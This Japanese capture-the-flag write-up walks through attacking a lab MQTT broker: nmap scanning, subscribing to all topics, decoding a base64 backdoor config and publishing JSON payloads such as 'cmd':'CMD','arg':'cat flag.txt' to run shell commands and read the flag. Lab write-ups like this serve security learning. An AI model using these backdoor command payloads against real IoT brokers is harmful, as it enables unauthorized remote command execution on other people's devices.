### 🦋 Enum 
```
nmap -Pn -sS 10.10.25.229 -p- --min-rate=1000 -vv

Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE REASON
1883/tcp open  mqtt    syn-ack ttl 60
```
```
nmap -Pn -sVC 10.10.25.229 -p 1883 -vv -T4

PORT     STATE SERVICE                  REASON  VERSION
1883/tcp open  mosquitto version 2.0.14 syn-ack
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     $SYS/broker/publish/bytes/sent: 349
|     $SYS/broker/load/connections/5min: 0.51
|     $SYS/broker/version: mosquitto version 2.0.14
|     $SYS/broker/load/messages/received/1min: 86.11
|     $SYS/broker/load/bytes/received/5min: 1912.58
|     $SYS/broker/load/publish/sent/5min: 6.68
|     livingroom/speaker: {"id":211551651046996595,"gain":41}
|     $SYS/broker/load/sockets/15min: 0.25
|     $SYS/broker/messages/stored: 36
|     $SYS/broker/load/messages/sent/15min: 18.52
|     $SYS/broker/messages/received: 269
|     storage/thermostat: {"id":3296708289509929431,"temperature":24.104994}
|     $SYS/broker/load/publish/sent/15min: 2.25
|     $SYS/broker/clients/inactive: 0
|     $SYS/broker/clients/connected: 2
|     $SYS/broker/uptime: 176 seconds
|     patio/lights: {"id":15868680515623395794,"color":"BLUE","status":"ON"}
|     $SYS/broker/subscriptions/count: 3
|     $SYS/broker/load/messages/received/5min: 40.58
|     $SYS/broker/clients/active: 2
|     $SYS/broker/load/messages/sent/5min: 47.26
|     $SYS/broker/clients/total: 2
|     $SYS/broker/load/sockets/5min: 0.69
|     $SYS/broker/load/sockets/1min: 2.49
|     $SYS/broker/load/bytes/received/15min: 767.85
|     $SYS/broker/publish/messages/sent: 62
|     $SYS/broker/bytes/sent: 3686
|     $SYS/broker/load/connections/15min: 0.19
|     $SYS/broker/publish/bytes/received: 8994
|     $SYS/broker/load/connections/1min: 1.89
|     $SYS/broker/messages/sent: 330
|     $SYS/broker/load/messages/received/15min: 16.27
|     $SYS/broker/load/bytes/sent/15min: 155.79
|     $SYS/broker/clients/disconnected: 0
|     $SYS/broker/bytes/received: 12702
|     $SYS/broker/clients/maximum: 2
|     $SYS/broker/retained messages/count: 38
|     $SYS/broker/store/messages/count: 36
|     $SYS/broker/load/publish/sent/1min: 31.07
|     $SYS/broker/load/messages/sent/1min: 117.18
|     $SYS/broker/store/messages/bytes: 271
|     $SYS/broker/load/bytes/sent/1min: 1594.43
|     $SYS/broker/load/bytes/sent/5min: 431.08
|_    $SYS/broker/load/bytes/received/1min: 4023.83

Nmap done: 1 IP address (1 host up) scanned in 16.03 seconds
```

```
curl 10.10.25.229:1883 -vv
*   Trying 10.10.25.229:1883...
* Connected to 10.10.25.229 (10.10.25.229) port 1883 (#0)
> GET / HTTP/1.1
> Host: 10.10.25.229:1883
> User-Agent: curl/7.88.1
> Accept: */*
> 
* Recv failure: 接続が相手からリセットされました
* Closing connection 0
curl: (56) Recv failure: 接続が相手からリセットされました
```

mosquitto version 2.0.14 とヒントから対象はMQTTサーバっぽい。

https://book.hacktricks.xyz/network-services-pentesting/1883-pentesting-mqtt-mosquitto

こちらの記事から、以下のクライアントで通信してみることにした。

https://github.com/bapowell/python-mqtt-client-shell

### 🦋 Flag

```
└─$ python MQTT_Client.py

Welcome to the MQTT client shell.
Type help or ? to list commands.
Pressing <Enter> on an empty line will repeat the last command.

Client args: client_id=paho-8695-kali, clean_session=True, protocol=4 (MQTTv3.1.1), transport=tcp
Logging: on (indent=30), Recording: off, Pacing: 0
> logging off

Client args: client_id=paho-8695-kali, clean_session=True, protocol=4 (MQTTv3.1.1), transport=tcp
Logging: off, Recording: off, Pacing: 0
> connection

Connection args: host=localhost, port=1883, keepalive=60, bind_address=, will=None,
                 username=, password=, 
                 TLS/SSL args: ca_certs_filepath=None, ...  (TLS not used)
Client args: client_id=paho-8695-kali, clean_session=True, protocol=4 (MQTTv3.1.1), transport=tcp
Logging: off, Recording: off, Pacing: 0

> host 10.10.25.229

Connection args: host=10.10.25.229, port=1883, keepalive=60, bind_address=, will=None,
                 username=, password=, 
                 TLS/SSL args: ca_certs_filepath=None, ...  (TLS not used)
Client args: client_id=paho-8695-kali, clean_session=True, protocol=4 (MQTTv3.1.1), transport=tcp
Logging: off, Recording: off, Pacing: 0
> connect

***CONNECTED***
Subscriptions: 
Connection args: host=10.10.25.229, port=1883, keepalive=60, bind_address=, will=None,
                 username=, password=, 
                 TLS/SSL args: ca_certs_filepath=None, ...  (TLS not used)
Client args: client_id=paho-8695-kali, clean_session=True, protocol=4 (MQTTv3.1.1), transport=tcp
Logging: off, Recording: off, Pacing: 0

> subscribe #
...msg_id=1, result=0 (No error.)

***CONNECTED***
Subscriptions: (topic=#,qos=0)
Connection args: host=10.10.25.229, port=1883, keepalive=60, bind_address=, will=None,
                 username=, password=, 
                 TLS/SSL args: ca_certs_filepath=None, ...  (TLS not used)
Client args: client_id=paho-8695-kali, clean_session=True, protocol=4 (MQTTv3.1.1), transport=tcp
Logging: off, Recording: off, Pacing: 0
>                               on_message(): message received: Topic: patio/lights, QoS: 0, Payload Length: 58
                                                              Payload (str): b'{"id":16203475553139602730,"color":"WHITE","status":"OFF"}'
                                                              Payload (hex): b'7b226964223a31363230333437353535333133393630323733302c22636f6c6f72223a225748495445222c22737461747573223a224f4646227d'
                              on_message(): message received: Topic: frontdeck/camera, QoS: 0, Payload Length: 97
                                                              Payload (str): b'{"id":12711243125979531289,"yaxis":-30.734741,"xaxis":8.347092,"zoom":3.7394342,"movement":false}'

```
ホスト設定後、チュートリアルとおりのコマンドでそれっぽいデータ受信を確認。

しばらくしてると、Topic: yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config　で始まるB64されたおかしいMSGを受信するのでPayloadをデコードする。

![image](https://user-images.githubusercontent.com/6504854/236677887-22e8a30d-698b-49a2-a686-cf07b1633e53.png)

![image](https://user-images.githubusercontent.com/6504854/236678248-ef0391ea-3f28-4215-82f6-ed5868d47632.png)

この電文を元にopicとPayloadの組み合わせを考えいれてみた。
```
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","registered_commands":["HELP","CMD","SYS"],"pub_topic":"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub","sub_topic":"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"}
```
```
publish pub_topic "U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub"
publish pub_topic "HELP"
publish pub_topic "CMD"
publish pub_topic "SYS"
publish U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub "HELP"
publish U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub "CMD"
publish U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub "SYS"

publish sub_topic "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"
publish sub_topic "HELP"
publish sub_topic "CMD"
publish sub_topic "SYS"
publish XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub "HELP"
publish XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub "CMD"
publish XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub "SYS"
```
![image](https://user-images.githubusercontent.com/6504854/236678975-ad9603e0-3a2f-42e1-8c33-672bd1134fa6.png)
![image](https://user-images.githubusercontent.com/6504854/236679221-65f00435-d344-4fef-a0da-3a11ea94bdd1.png)

どうも下３こ反応しているように見受けられる。デコードする。argってなに？（なんらかの引数でしょうね、はい）。
また以下PayloadをB64していれてみる。

```
{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "HELP"}
{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "HELP", "arg": ""}
{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD"}
{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "ls"}
{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "SYS"}
{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "SYS", "arg": ""}
```

{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "ls"} の結果
![image](https://user-images.githubusercontent.com/6504854/236681441-19e41a13-e671-403f-ae9c-a8b8dc82c08b.png)

{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "cat flag.txt"} の結果
![image](https://user-images.githubusercontent.com/6504854/236682086-4a630e7a-234e-4fd5-93b9-cf4ab34626d3.png)


うーん。B64して遊んでたら休みが終わった。。。MQTTの仕様はなんもわかってない。

### 🦋 Omake

https://securitycafe.ro/2022/04/08/iot-pentesting-101-how-to-hack-mqtt-the-standard-for-iot-messaging/

こちらの図がわかりやすい。
今回の場合、MQTT Broker（サーバ）がなぜかバックドアIDとコマンドを配信してくれてた？


